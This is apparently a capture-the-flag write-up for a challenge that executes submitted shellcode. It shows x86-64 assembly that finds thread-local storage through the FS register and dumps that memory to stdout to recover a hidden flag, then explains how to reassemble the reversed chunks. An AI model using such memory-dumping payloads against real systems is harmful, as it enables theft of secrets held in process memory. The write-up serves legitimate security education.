
---

# Threads Challenge Writeup

## Challenge Overview

**Description:** The challenge provides a service that accepts and executes shellcode in an RWX mmapped region. No binary is provided.
**Hint:** The description emphasizes "Threads" and mentions that secrets are stored using `__thread` variables (Thread Local Storage).
**Flag Format:** The flag is split into 4-byte `unsigned int` chunks, with characters reversed within each chunk.

## Vulnerability Analysis

The core vulnerability is **Arbitrary Shellcode Execution**. However, the difficulty lies in locating the flag in memory without a binary to reverse engineer.

The key hint is the usage of `volatile __thread`. On Linux x86-64 systems, Thread Local Storage (TLS) is managed via the **FS segment register**.

* The `FS` register points to the **Thread Control Block (TCB)**.
* Local thread variables (like the flag chunks mentioned) are typically stored immediately **before** the address pointed to by `FS` (at negative offsets).

## Exploit Steps

### 1. Locate Thread Local Storage (TLS)

To access the TLS area, we need the linear address of the TCB. In x86-64 assembly, we cannot read the `FS` register directly to get the address, but the TCB contains a pointer to itself at `fs:[0]`.

### 2. Dump Memory

We construct shellcode to:

1. Read the TCB address from `fs:[0]`.
2. Subtract an offset (e.g., `0x200`) to point to the start of the TLS variables.
3. Perform a `sys_write` syscall to dump this memory region to `stdout`.

```assembly
/* 1. Get the address of the Thread Control Block (FS Base) */
mov rsi, qword ptr fs:[0]

/* 2. Move pointer back to cover TLS variables
      TLS data is located at negative offsets relative to FS base.
      0x200 is a safe heuristic range. */
sub rsi, 0x200

/* 3. Write memory to stdout (File Descriptor 1) */
mov rax, 1          /* sys_write */
mov rdi, 1          /* stdout */
mov rdx, 0x300      /* length to dump */
syscall

/* 4. Exit */
mov rax, 60
xor rdi, rdi
syscall

```

### 3. Reconstruct Flag

The output will be a raw memory dump. According to the description, the flag is stored as integers representing 4-character chunks, reversed.

**Example Dump Pattern:**
If the dump contains `... {CFT ...`, it corresponds to the chunk `volatile __thread unsigned int flag1 = '{CFT';`.

* Reversed: `TFC{`

We simply parse the dump for printable strings and reverse every 4-byte chunk to assemble the final flag.